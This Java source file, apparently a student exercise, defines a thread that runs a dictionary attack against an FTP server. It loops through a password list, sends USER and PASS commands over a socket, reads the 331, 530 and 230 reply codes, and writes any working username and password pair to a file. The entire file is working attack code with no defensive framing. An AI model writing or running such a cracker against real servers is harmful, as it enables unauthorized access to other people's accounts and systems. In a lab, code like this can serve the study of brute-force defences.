/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package crackeadordefinitivo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author alumno
 */
public class HebraCrackeadora extends Thread {

    HebraLectoraCrackeadora hebraLectoraCrackeadora;
    int port;
    Socket canal;
    String ip;
    String usuario;
    int segundos;
    String rutaContrasenias;
    LinkedList<String> mensajes;
    FileWriter fw;
    BufferedWriter bw;

    public HebraCrackeadora(String usuario, String rutaContrasenias, String rutaPares, String ip, int puerto) {
        this.port = puerto;
        this.ip = ip;
        this.rutaContrasenias = rutaContrasenias;
        this.usuario = usuario;
        mensajes = new LinkedList<>();
        try {
            fw = new FileWriter(rutaPares, true);
            bw = new BufferedWriter(fw);
        } catch (IOException ex) {
        }
    }

    @Override
    public void run() {
        boolean intentoAcertado = false;
        int i = 0;

        try {

            File contaseniasTxt = new File(rutaContrasenias);
            FileReader fr = new FileReader(contaseniasTxt);
            BufferedReader br = new BufferedReader(fr);

            String contrasenia = br.readLine();

            while (contrasenia != null && !intentoAcertado) {
                try {

                    Thread.sleep(1);
                    this.canal = new Socket(ip, port);
                    PrintWriter salida = new PrintWriter(canal.getOutputStream());
                    hebraLectoraCrackeadora = new HebraLectoraCrackeadora(mensajes, canal);
                    hebraLectoraCrackeadora.start();
                    Thread.sleep(100);

                    while (mensajes.size() > 0) {
                        mensajes.pop();
                    }

                    if (mensajes.size() <= 0) {
                        salida.println("user " + usuario);
                        salida.flush();

                        Thread.sleep(5);

                        if (mensajes.pop().contains("331")) {
                            salida.println("pass " + contrasenia);
                            salida.flush();

                        }

                        while (mensajes.isEmpty()) {
                            Thread.sleep(250);
                        }

                        String mensaje = mensajes.pop();
                        if (mensaje.contains("530")) {
                            canal.close();
                        } else if (mensaje.contains("230")) {
                            intentoAcertado = true;
                            bw.write("usuario: " + usuario + " contrasenia: " + contrasenia + "\n");
                            bw.flush();

                        }
                    }
                    this.canal.close();

                } catch (IOException ex) {
                    Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
                } catch (InterruptedException ex) {
                    Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
                }
                contrasenia = br.readLine();
            }
        } catch (Exception ex) {
        }
    }
}
